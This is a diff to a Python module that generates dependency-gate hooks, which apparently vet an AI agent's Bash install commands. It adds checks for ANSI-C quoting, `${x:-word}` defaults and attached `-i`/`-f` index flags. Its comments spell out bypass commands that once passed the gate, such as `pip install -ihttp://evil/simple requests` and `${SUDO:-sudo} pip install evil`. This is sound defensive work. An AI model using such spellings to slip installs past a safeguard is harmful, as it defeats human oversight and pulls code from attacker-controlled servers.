@@ -256,6 +256,103 @@ def _unquote_word(tok):
     return out
 
 
+def _ansic_char(esc):
+    # [X-36h] Reference: cmdpos.ansic_char. `_ANSIC_SAFE` is rendered into the
+    # prelude from cmdpos.ANSIC_SAFE, so the exclusion set cannot drift.
+    # THE OCTAL BRANCH MASKS TO A BYTE, because bash's octal escape is a BYTE
+    # and not a code point: printf of octal 560 emits 0o560 & 0xFF = `p`, and
+    # the shell transcription inherits that mask from printf. Without the mask
+    # this copy computed chr(368), emitted NO spelling, and was MORE PERMISSIVE
+    # than the shell on 89 of the 256 values in octal 400-777 - the forbidden
+    # direction. NOTE THIS BODY IS A NON-RAW PYTHON STRING: no backslash may
+    # appear in this comment (an octal escape here would be EATEN, and a `N`
+    # after one is a SyntaxError that fails the whole install).
+    try:
+        _v = (int(esc[1:], 16) if esc[:1] in ("x", "u", "U")
+              else int(esc, 8) & 0xFF)
+    except ValueError:
+        return ""
+    if _v > 0x10FFFF:
+        return ""
+    _ch = chr(_v)
+    return _ch if _ch in _ANSIC_SAFE else ""
+
+
+def _ansic_decode(cmd):
+    # [X-36h] Reference: cmdpos.ansic_decode. The run is RE-EMITTED STILL
+    # QUOTED - emitting the body bare would turn `git commit -m $'pip install
+    # evil'` into three words - and an unterminated run stays unterminated.
+    if "$'" not in cmd:
+        return cmd
+    out = []
+    i, n = 0, len(cmd)
+    while i < n:
+        if cmd[i] == "$" and i + 1 < n and cmd[i + 1] == "'":
+            j = i + 2
+            body = []
+            while j < n and cmd[j] != "'":
+                if cmd[j] == chr(92) and j + 1 < n:
+                    body.append(cmd[j:j + 2])
+                    j += 2
+                    continue
+                body.append(cmd[j])
+                j += 1
+            dec = _ANSIC_RE.sub(
+                lambda m: _ansic_char(m.group(1)) or m.group(0), "".join(body))
+            _closed = j < n
+            out.append("$'" + dec + ("'" if _closed else ""))
+            i = j + 1 if _closed else j
+            continue
+        out.append(cmd[i])
+        i += 1
+    return "".join(out)
+
+
+def _param_default(cmd):
+    # [X-36h] Reference: cmdpos.param_default. `_PARAM_DEFAULT_RE` is rendered
+    # into the prelude from cmdpos.PARAM_DEFAULT_RE_SRC with `%r` - NOT
+    # hand-written here. This module's body is a NON-RAW Python string in
+    # lib/sdk_gates_template.py, and a hand-written negated class lost one
+    # backslash on the way out, which excluded the letter `s` from the literal
+    # class and made `${SUDO:-sudo} pip install evil` shell=deny / SDK=allow.
+    if "${" not in cmd:
+        return cmd
+    return _PARAM_DEFAULT_RE.sub(lambda m: m.group(1), cmd)
+
+
+def _budget_len(s):
+    # [X-36h] Reference: cmdpos.budget_len. THE BUDGET IS IN UTF-8 BYTES and
+    # this is NOT `len`, deliberately. `len` counts code points; the shell
+    # half counts whatever the ambient locale tells it to, which is bytes
+    # under LC_ALL=C and characters under a UTF-8 locale. Calling both of
+    # those "the length" put a substrate split behind an environment
+    # variable: the same multibyte command was deny/deny under en_US.UTF-8
+    # and shell=allow / SDK=deny under LC_ALL=C. The full argument for bytes
+    # is on cmdpos.RESOLVED_SPELLING_MAX; the shell's copy is _blen, which
+    # pins LC_ALL=C for exactly one parameter expansion.
+    #
+    # surrogatepass: a command arrives through JSON, a lone surrogate escape
+    # decodes to a lone surrogate, and plain encode raises on it. Raising
+    # here crashes the gate, and a PreToolUse crash fails CLOSED.
+    return len((s or "").encode("utf-8", "surrogatepass"))
+
+
+def _resolved_spelling(raw):
+    # [X-36h] Reference: cmdpos.resolved_spelling. `_RESOLVED_MAX` is rendered
+    # into the prelude from cmdpos.RESOLVED_SPELLING_MAX, so this substrate,
+    # the shell's `@@RESOLVED_MAX@@` and the reference are ONE number, in ONE
+    # unit - see `_budget_len`. The argument for the budget is on the
+    # constant; the short version is that the shell half of this pair fails
+    # CLOSED at a 60 s timeout, a deny-only rewrite must not push a command
+    # that PASSED at v2.7.1 past that ceiling, and skipping the spelling
+    # restores the v2.7.1 verdict exactly.
+    raw = raw or ""
+    if _budget_len(raw) > _RESOLVED_MAX:
+        return ""
+    out = _param_default(_ansic_decode(raw))
+    return "" if out == raw else out
+
+
 def _cmd_spellings(input_data) -> tuple:
     # THE ONLY SANCTIONED WAY to read a Bash command in this module. A gate
     # that reaches for `_tool_input(...).get("command")` directly gets an
@@ -277,9 +374,21 @@ def _cmd_spellings(input_data) -> tuple:
     # The second element is `""` - not a copy - when the fold changed nothing,
     # and both consumers skip an empty spelling, so the ordinary command is
     # scanned exactly once.
+    #
+    # [X-36h] THIRD SPELLING: what the DECIDABLE expansions resolve to. A bare
+    # `$KUBECTL` yields nothing here - only an ANSI-C numeric escape or a
+    # LITERAL `${x:-word}` branch does - which is why this cannot reproduce
+    # the ordinary-command refusals that got two deny-arm attempts reverted.
+    # Deny-only by construction: both consumers refuse if ANY spelling
+    # refuses, so a spelling can add a refusal and never remove one.
     _raw = _tool_input(input_data).get("command") or ""
     _norm = _cmd_norm(_raw)
-    return (_norm, "") if _norm == _raw else (_norm, _raw)
+    _unf = "" if _norm == _raw else _raw
+    _res = _resolved_spelling(_raw)
+    _res = _cmd_norm(_res) if _res else ""
+    if _res in (_norm, _unf, _raw):
+        _res = ""
+    return (_norm, _unf, _res)
 
 
 def _cmd_of(input_data) -> str:
@@ -1119,8 +1228,10 @@ _VALUE_FLAGS = frozenset({
 # extreme case - an arbitrary source with no package name at all.
 # Consuming the value and then checking the package name proves nothing,
 # because the flag redirects even an APPROVED package.
-# `-f` is deliberately absent: it is pip's --find-links but npm's --force,
-# and blaming the wrong one gives worse advice than an ordinary value flag.
+# BARE `-f` is deliberately absent: it is pip's --find-links but npm's
+# --force, and blaming the wrong one gives worse advice than an ordinary
+# value flag. That exemption is for the SEPARATED spelling only - the
+# ATTACHED `-f<value>` is caught below, as the shell catches it.
 # Shell parity.
 _SRC_OVERRIDE_REASON = (
     "Dependency gate: a remote source override is not verifiable.\\n"
@@ -1131,7 +1242,47 @@ _SRC_OVERRIDE_REASON = (
 _INDEX_FLAGS = frozenset({
     "-i", "--index-url", "--extra-index-url", "--find-links", "--registry",
     "--index", "--git", "--repo",
+    # `--default-index` and `--index-strategy` are uv's spellings and are in
+    # the shell's arm; they were missing here, and the miss was not cosmetic.
+    # `pip install --default-index ./localwheels requests` was shell=deny /
+    # sdk=ALLOW at v2.7.1: the unknown long flag fell through
+    # `tok.startswith("-")`, its value was a LOCAL PATH so the local-path arm
+    # skipped it too, and the only remaining token was an approved package.
+    # The URL spelling agreed by accident - the URL was read as a package
+    # name and refused as unapproved, which is also why
+    # `--index-strategy unsafe-best-match` denied with "not in deps.md
+    # approved list: unsafe-best-match", the exact unactionable advice
+    # F-1357 was filed to remove. Shell parity, name for name.
+    "--default-index", "--index-strategy",
 })
+# THE ATTACHED SPELLING OF THE SAME OVERRIDE, which this frozenset cannot
+# express because it is EXACT-MATCH. The shell's index arm ends with the globs
+# `-i?*|-f?*`, so `pip install -ihttp://evil/simple requests` denies there;
+# here the attached token matched no entry above, fell through
+# `if tok.startswith("-"): continue` as an ordinary flag, and the line was
+# ALLOWED - SDK-more-permissive, the forbidden direction, and a real
+# capability grant rather than a cosmetic split: an index override redirects
+# even an APPROVED package to an attacker's server, and `requests` in that
+# example IS on the approved list. Measured at v2.7.1, shell=deny/sdk=allow
+# for `-ihttp://`, `-fhttp://`, `uv pip install -ihttp://` and
+# `python3 -m pip install -ihttp://`.
+#
+# The shell's `?` requires ONE character after the flag, so a two-character
+# token never matches it and must not match here either: BARE `-f` stays npm's
+# --force, an ordinary value flag on both substrates (`npm install -f` allows;
+# `npm install -f 0` still blocks `0` by package name, via _VALUE_FLAGS and
+# _is_flag_value). Bare `-i` is already an exact entry above. Shell parity,
+# glob for glob.
+_ATTACHED_INDEX_PREFIXES = ("-i", "-f")
+
+
+def _is_attached_index_flag(tok):
+    """True for the attached `-i<value>` / `-f<value>` index overrides.
+    Shell parity (the `-i?*|-f?*` globs); bare `-i`/`-f` are excluded by the
+    length test exactly as the shell's `?` excludes them."""
+    return len(tok) > 2 and tok[:2] in _ATTACHED_INDEX_PREFIXES
+
+
 # [round-2 review] See the shell gate's is_flag_value for the full account. The
 # first version matched `=` and `^[0-9]` and therefore swallowed real
 # package names - `7zip-bin`, `0x`, `2to3`, `evil==1.0` - as if they were
@@ -2317,7 +2468,12 @@ def _scan_install_line(line, approved):
             if "=" in tok and "://" in tok.split("=", 1)[1]:
                 return (_SRC_OVERRIDE_REASON
                         % (tok.split("=", 1)[0], tok.split("=", 1)[1]), "")
-            if tok in _INDEX_FLAGS:
+            # The ATTACHED spelling (`-ihttp://evil/simple`) is the same
+            # override as the separated one and the shell's `-i?*|-f?*`
+            # globs deny it; it used to reach `tok.startswith("-")` below
+            # and be skipped as an ordinary flag. Same arm, so the operator
+            # gets the same reason the separated spelling gets.
+            if tok in _INDEX_FLAGS or _is_attached_index_flag(tok):
                 return ("Dependency gate: a package-index override is not "
                         "verifiable.\\nIt redirects even an APPROVED package "
                         "to another server. Remove it,\\nor set the index in "
@@ -2761,6 +2917,22 @@ def sdk_gates_module(cfg: dict) -> str:
         "_ANSIC_QUOTES = %r\n"
         "_NL_JOIN_OPS = %r\n"
         "_CMD_PFX_RE = %r\n\n"
+        "# [X-36h] The two DECIDABLE expansions, rendered from cmdpos with\n"
+        "# `%%r` rather than hand-written into the static body. Both carry a\n"
+        "# CAPTURE group, so neither goes through `_py()`. Hand-writing them\n"
+        "# cost a real SDK-more-permissive split: the static body is a\n"
+        "# NON-RAW string, a negated class lost a backslash, and the emitted\n"
+        "# class excluded the letter `s` from the literal-default word.\n"
+        "_ANSIC_RE = re.compile(%r)\n"
+        "_ANSIC_SAFE = frozenset(%r)\n"
+        "_PARAM_DEFAULT_RE = re.compile(%r)\n"
+        "# [X-36h perf] How many UTF-8 BYTES a command may be before the\n"
+        "# third spelling is skipped. Rendered from\n"
+        "# cmdpos.RESOLVED_SPELLING_MAX, which also renders the shell hook's\n"
+        "# copy; the guard is deny-only, so a skipped spelling restores the\n"
+        "# v2.7.1 verdict exactly. BYTES, not characters, because that is\n"
+        "# the only unit bash can count in every locale - see _budget_len.\n"
+        "_RESOLVED_MAX = %d\n\n"
         "_DOWNLOADERS = frozenset(%r)\n"
         "_INTERPRETERS = frozenset(%r)\n"
         "# [round-4 P1/P3] The four word sets the D20 walks were missing.\n"
@@ -2806,6 +2978,8 @@ def sdk_gates_module(cfg: dict) -> str:
            sorted(cmdpos.DUAL),
            tuple(cmdpos.ANSIC_QUOTES), tuple(cmdpos.NL_JOIN_OPS),
            _py(cmdpos.anchor_regex(space=r"\s+", nonspace=r"\S")),
+           cmdpos.ANSIC_RE_SRC, cmdpos.ANSIC_SAFE,
+           cmdpos.PARAM_DEFAULT_RE_SRC, cmdpos.RESOLVED_SPELLING_MAX,
            sorted(cmdpos.DOWNLOADERS), sorted(cmdpos.INTERPRETERS),
            sorted(cmdpos.FILE_RUNNERS), sorted(cmdpos.COMPOUND_HEADS),
            sorted(cmdpos.INERT_FILTERS), sorted(cmdpos.WRITER_WORDS),
